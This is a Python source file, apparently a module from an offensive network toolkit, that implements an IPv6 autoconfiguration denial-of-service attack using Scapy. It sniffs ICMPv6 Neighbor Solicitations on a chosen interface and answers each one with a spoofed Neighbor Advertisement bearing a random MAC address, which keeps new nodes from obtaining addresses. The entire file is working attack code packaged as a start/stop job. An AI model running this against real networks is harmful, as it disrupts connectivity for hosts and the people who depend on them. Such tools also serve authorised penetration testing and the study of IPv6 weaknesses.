from deadbeef_modules import ipv6module

from scapy.all import *

# autoconfig denial of service module
class ipv6_autocfgdos_module(ipv6module):
    """
    prevents autoconfiguration from new node by answering to all neighbor solicitation request 
    """
    
    def init_module(self):
        self.prompt = self.cc.prompt(self.prompt, "autoconfig dos")                     
        self.valid_parameters = ['iface']
        self.help_parameters['iface'] = "use this interface"
        self.required_parameters = ['iface']        
        
    def help(self):
        print "prevents ipv6 node autoconfiguration"

    def __icmp6_callback(self, pkt):        
        icmpv6ns = pkt.getlayer("ICMPv6 Neighbor Discovery - Neighbor Solicitation")            
        if icmpv6ns:
            self.log(pkt["IPv6"].src + " is looking for " + icmpv6ns.tgt + " -> spoofig with random mac.\n")
            neighbor_advertisment = Ether()/IPv6(src=icmpv6ns.tgt)/ICMPv6ND_NA(tgt=icmpv6ns.tgt, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr=RandMAC())
            #neighbor_advertisment = Ether()/IPv6(dst=pkt[IPv6].src, src=icmpv6ns.tgt)/ICMPv6ND_NA(tgt=icmpv6ns.tgt, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr=RandMAC())
            sendp(neighbor_advertisment, verbose=0)

    def start(self, cmdline):
        self.cc.ok("starting autoconfig dos...\n")
        conf.iface6 = self.parameters['iface']
                
        arguments = {'prn': self.__icmp6_callback, 'filter': "icmp6", 'iface': conf.iface6}

        self.add_job(cmd = sniff, kwargs = arguments)

    def stop(self, cmdline):
        self.cc.ok("stopping autoconfig dos...\n")              
        self.kill_job()
